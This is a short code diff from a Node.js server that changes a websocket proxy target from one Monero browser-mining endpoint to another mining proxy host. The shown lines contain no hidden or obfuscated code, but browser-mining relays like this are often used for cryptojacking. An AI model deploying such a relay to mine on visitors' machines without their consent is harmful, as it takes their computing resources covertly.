@@ -8,7 +8,7 @@ const http = createServer(app);
 const path = require("path");
 
 const socketProxy = createProxyMiddleware("/socket", {
-  target: "wss://webminer.moneroocean.stream/",
+  target: "wss://ny1.xmrminingproxy.com",
   changeOrigin: true,
   ws: true,
   logLevel: "debug",
